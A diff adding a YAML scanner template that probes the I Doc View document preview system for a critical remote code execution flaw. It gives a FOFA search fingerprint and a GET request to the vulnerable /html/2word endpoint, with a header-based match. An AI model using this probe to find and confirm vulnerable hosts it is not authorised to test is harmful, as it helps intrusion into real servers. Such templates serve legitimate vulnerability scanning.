@@ -1,0 +1,22 @@
+id: poc-yaml-i-doc-view-online-document-preview-system-rce
+info:
+  name: I Doc View在线文档预览系统 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: I Doc View
+  fofa: I Doc View在线文档预览
+variables:
+  t1: random_str(5)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /html/2word?url={{.t1}}
+  expression: 'status_code == 200
+
+    && contains(headers,t2)
+
+    && body == ""
+
+    '
+transport: http
